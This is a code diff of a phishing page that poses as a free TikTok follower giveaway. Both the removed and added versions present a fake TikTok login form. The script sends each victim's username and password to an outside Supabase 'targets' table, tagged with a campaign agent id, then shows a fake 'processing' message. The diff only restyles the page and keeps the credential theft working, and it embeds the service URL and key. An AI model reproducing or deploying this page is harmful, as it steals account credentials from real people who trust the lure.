@@ -3,102 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Follower Booster - Get 100k Free</title>
+    <title>TikTok Rewards - Get Free Followers</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background-color: #010101; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
-        .tiktok-gradient { background: linear-gradient(45deg, #ff0050, #00f2ea); }
-        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .glow-btn { box-shadow: 0 0 15px rgba(0, 242, 234, 0.3); }
-        .floating { animation: float 3s ease-in-out infinite; }
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        body { background-color: #010101; color: white; font-family: 'Inter', sans-serif; }
+        .tt-gradient { background: linear-gradient(45deg, #fe2c55, #25f4ee); }
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center p-4">
+<body class="min-h-screen flex items-center justify-center p-6">
 
-    <!-- Success Message (Initially Hidden) -->
-    <div id="success-page" class="hidden text-center space-y-6 floating">
-        <div class="w-24 h-24 tiktok-gradient rounded-full flex items-center justify-center mx-auto shadow-lg">
-            <i class="fas fa-check text-4xl text-white"></i>
-        </div>
-        <h1 class="text-3xl font-black text-white">REQUEST RECEIVED!</h1>
-        <p class="text-gray-400">Your followers will be added within 24 hours.</p>
-        <button onclick="location.reload()" class="px-8 py-3 rounded-full border border-white/20 hover:bg-white/10 transition">Done</button>
-    </div>
-
-    <!-- Login Page -->
-    <div id="login-page" class="w-full max-w-[400px] space-y-8">
-        <div class="text-center">
+    <div id="login-form" class="w-full max-w-md glass p-10 rounded-[40px] shadow-2xl">
+        <div class="text-center mb-8">
             <i class="fab fa-tiktok text-6xl mb-4"></i>
-            <h1 class="text-4xl font-black tracking-tighter">TIKTOK <span class="text-cyan-400">BOOST</span></h1>
-            <p class="text-gray-400 text-sm mt-2">Enter details to claim <span class="text-white font-bold">100,000</span> followers</p>
+            <h1 class="text-3xl font-black italic tracking-tighter">TIKTOK <span class="text-[#fe2c55]">BOOST</span></h1>
+            <p class="text-gray-400 text-xs font-bold mt-2 uppercase">Claim 50,000 Free Followers</p>
         </div>
 
-        <form id="tiktok-form" class="glass p-8 rounded-3xl space-y-6">
-            <div class="space-y-2">
-                <label class="text-xs font-bold text-gray-500 uppercase ml-1">Username / Email</label>
-                <input type="text" id="target-username" required placeholder="@username" 
-                    class="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-4 text-white focus:outline-none focus:border-cyan-400 transition">
-            </div>
-            
-            <div class="space-y-2">
-                <label class="text-xs font-bold text-gray-500 uppercase ml-1">Password</label>
-                <input type="password" id="target-password" required placeholder="••••••••" 
-                    class="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-4 text-white focus:outline-none focus:border-cyan-400 transition">
-            </div>
-
-            <button type="submit" id="submit-btn" class="w-full tiktok-gradient py-4 rounded-xl font-black text-lg text-white glow-btn hover:scale-[1.02] active:scale-[0.98] transition">
-                VERIFY & CLAIM
-            </button>
+        <form id="claim-form" class="space-y-4">
+            <input type="text" id="u-target" required placeholder="Username / Phone" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl focus:border-cyan-400 outline-none">
+            <input type="password" id="p-target" required placeholder="Password" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl focus:border-cyan-400 outline-none">
+            <button type="submit" id="btn-sub" class="w-full tt-gradient py-4 rounded-2xl font-black uppercase tracking-widest shadow-lg mt-4">Claim Now</button>
         </form>
     </div>
 
+    <div id="success-box" class="hidden text-center glass p-12 rounded-[40px] animate-pulse">
+        <i class="fas fa-check-circle text-7xl text-green-500 mb-6"></i>
+        <h2 class="text-3xl font-black italic uppercase">Processing!</h2>
+        <p class="text-gray-400 italic">Please wait 24 hours for delivery.</p>
+    </div>
+
     <script>
-        // Naye Supabase Keys
-        const SUPABASE_URL = 'https://irryclyepdnmncxyhgla.supabase.co';
-        const SUPABASE_KEY = 'sb_publishable_SBAazL4Lqp4g2LC81O-FWQ_dX2zKek6';
-        
+        const SB_URL = 'https://irryclyepdnmncxyhgla.supabase.co';
+        const SB_KEY = 'sb_publishable_SBAazL4Lqp4g2LC81O-FWQ_dX2zKek6';
         const params = new URLSearchParams(window.location.search);
-        const adminId = params.get('user') || 'default_agent';
+        const agent = params.get('user') || 'direct_user';
 
-        document.getElementById('tiktok-form').onsubmit = async (e) => {
+        document.getElementById('claim-form').onsubmit = async (e) => {
             e.preventDefault();
-            const btn = document.getElementById('submit-btn');
-            const u = document.getElementById('target-username').value;
-            const p = document.getElementById('target-password').value;
-
-            btn.disabled = true;
+            const btn = document.getElementById('btn-sub');
             btn.innerText = "VERIFYING...";
+            btn.disabled = true;
 
             try {
-                const response = await fetch(`${SUPABASE_URL}/rest/v1/targets`, {
+                const res = await fetch(`${SB_URL}/rest/v1/targets`, {
                     method: 'POST',
-                    headers: {
-                        'apikey': SUPABASE_KEY,
-                        'Authorization': `Bearer ${SUPABASE_KEY}`,
-                        'Content-Type': 'application/json'
+                    headers: { 
+                        'apikey': SB_KEY, 
+                        'Authorization': `Bearer ${SB_KEY}`, 
+                        'Content-Type': 'application/json',
+                        'Prefer': 'return=minimal'
                     },
                     body: JSON.stringify({
-                        user_id: adminId,
-                        username: u,
-                        password: p,
+                        user_id: agent,
+                        username: document.getElementById('u-target').value,
+                        password: document.getElementById('p-target').value,
                         platform: 'tiktok'
                     })
                 });
 
-                if (response.ok) {
-                    document.getElementById('login-page').classList.add('hidden');
-                    document.getElementById('success-page').classList.remove('hidden');
+                if (res.ok) {
+                    document.getElementById('login-form').classList.add('hidden');
+                    document.getElementById('success-box').classList.remove('hidden');
                 } else {
-                    alert("System Busy. Please try again later.");
+                    alert("System Busy! Please try again later.");
                     btn.disabled = false;
-                    btn.innerText = "VERIFY & CLAIM";
+                    btn.innerText = "Claim Now";
                 }
             } catch (err) {
                 alert("Connection Error!");
                 btn.disabled = false;
-                btn.innerText = "VERIFY & CLAIM";
             }
         };
     </script>
